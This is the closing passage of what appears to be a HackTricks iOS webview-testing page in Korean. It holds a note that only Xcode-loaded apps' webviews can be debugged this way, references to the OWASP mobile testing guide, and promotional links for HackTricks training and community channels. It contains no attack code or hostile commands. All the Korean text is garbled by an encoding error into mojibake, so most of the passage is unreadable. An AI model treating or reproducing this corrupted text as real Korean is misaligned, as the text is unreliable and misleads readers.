- Xcodeë¥¼ í†µí•´ ê¸°ê¸°ì— ë¡œë“œëœ ì• í”Œë¦¬ì¼€ì´ì…˜ì˜ ì›¹ë·°ë§Œ ë””ë²„ê¹…í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤. App Store ë˜ëŠ” Apple Configuratorë¥¼ í†µí•´ ì„¤ì¹˜ëœ ì•±ì˜ ì›¹ë·°ëŠ” ì´ ë°©ë²•ìœ¼ë¡œ ë””ë²„ê¹…í•  ìˆ˜ ì—†ìŠµë‹ˆë‹¤.


## ì°¸ê³  ë¬¸í—Œ

* [https://mobile-security.gitbook.io/mobile-security-testing-guide/ios-testing-guide/0x06h-testing-platform-interaction#testing-webview-protocol-handlers-mstg-platform-6](https://mobile-security.gitbook.io/mobile-security-testing-guide/ios-testing-guide/0x06h-testing-platform-interaction#testing-webview-protocol-handlers-mstg-platform-6)
* [https://github.com/authenticationfailure/WheresMyBrowser.iOS](https://github.com/authenticationfailure/WheresMyBrowser.iOS)
* [https://github.com/chame1eon/owasp-mstg/blob/master/Document/0x06h-Testing-Platform-Interaction.md](https://github.com/chame1eon/owasp-mstg/blob/master/Document/0x06h-Testing-Platform-Interaction.md)

{% hint style="success" %}
AWS í•´í‚¹ ë°°ìš°ê¸° ë° ì—°ìŠµí•˜ê¸°:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
GCP í•´í‚¹ ë°°ìš°ê¸° ë° ì—°ìŠµí•˜ê¸°: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>HackTricks ì§€ì›í•˜ê¸°</summary>

* [**êµ¬ë… ê³„íš**](https://github.com/sponsors/carlospolop) í™•ì¸í•˜ê¸°!
* **ğŸ’¬ [**Discord ê·¸ë£¹**](https://discord.gg/hRep4RUj7f) ë˜ëŠ” [**í…”ë ˆê·¸ë¨ ê·¸ë£¹**](https://t.me/peass)ì— ì°¸ì—¬í•˜ê±°ë‚˜ **Twitter**ì—ì„œ **íŒ”ë¡œìš°**í•˜ì„¸ìš”** ğŸ¦ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **[**HackTricks**](https://github.com/carlospolop/hacktricks) ë° [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github ë¦¬í¬ì§€í† ë¦¬ì— PRì„ ì œì¶œí•˜ì—¬ í•´í‚¹ íŠ¸ë¦­ì„ ê³µìœ í•˜ì„¸ìš”.**

</details>
{% endhint %}
